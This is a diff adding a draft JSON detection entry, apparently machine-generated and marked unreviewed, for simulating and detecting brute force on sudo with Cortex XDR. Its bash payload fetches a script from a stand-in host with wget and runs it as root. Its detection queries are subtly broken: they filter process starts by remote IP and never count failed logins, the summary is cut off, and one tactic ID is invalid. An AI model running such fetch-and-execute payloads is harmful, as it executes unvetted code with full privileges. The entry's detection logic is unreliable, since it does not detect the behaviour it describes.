@@ -1,0 +1,167 @@
+{
+  "id": "TTP-0000-0028",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Repeated Failed Sudo Authentications Followed by Success",
+    "summary": "An attacker repeatedly attempts to authenticate to sudo with incorrect credentials for a user, then succeeds. Cortex should detect this pattern as a potential brute force attack on sudo privileges. Th",
+    "description": "An attacker repeatedly attempts to authenticate to sudo with incorrect credentials for a user, then succeeds. Cortex should detect this pattern as a potential brute force attack on sudo privileges. This behavior is flagged by the ABIOC 'Possible brute force on sudo user'."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1110",
+        "subtechnique_id": "T1110.001",
+        "name": "Brute Force: Password Guessing",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1548",
+        "subtechnique_id": "T1548.003",
+        "name": "T1548.003",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "wget -O /tmp/brute_force_script https://example.com/brute_force.sh\nchmod +x /tmp/brute_force_script\n/tmp/brute_force_script\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "sudo process execution",
+        "expected_value": "action_process_image_name = 'sudo'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to test-net-1",
+        "expected_value": "action_remote_ip = '192.0.2.1'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Sudo Brute Force Attempt",
+        "description": "Multiple failed sudo authentication attempts followed by a successful one within a short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sudo'\n| filter actor_process_image_name = 'bash'\n| filter action_file_path contains 'sudo'\n| filter action_remote_ip = '192.0.2.1'\n",
+        "mitre_technique_ids": [
+          "T1110.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Possible brute force on sudo user",
+        "description": "Detects repeated failed sudo authentications followed by a successful one, indicating brute force behavior",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sudo'\n| filter actor_process_image_name = 'bash'\n| filter action_file_path contains 'sudo'\n| filter action_remote_ip = '192.0.2.1'\n",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "sudo process execution with repeated failed auth attempts",
+        "mitre_technique_ids": [
+          "T1110.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Sudo Brute Force Hunt Query",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'sudo'\n| filter actor_process_image_name = 'bash'\n| filter action_file_path contains 'sudo'\n| filter action_remote_ip = '192.0.2.1'\n| comp count() as cnt by action_remote_ip, actor_process_image_name\n| comp count() as cnt by agent_hostname ",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Possible brute force on sudo user; Required Data: XDR Agent; ATT&CK T1110.001,T1548.003. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Possible brute force on sudo user",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/possible-brute-force-on-sudo-user",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1110.001",
+      "url": "https://attack.mitre.org/techniques/T1110/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1548.003",
+      "url": "https://attack.mitre.org/techniques/T1548/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
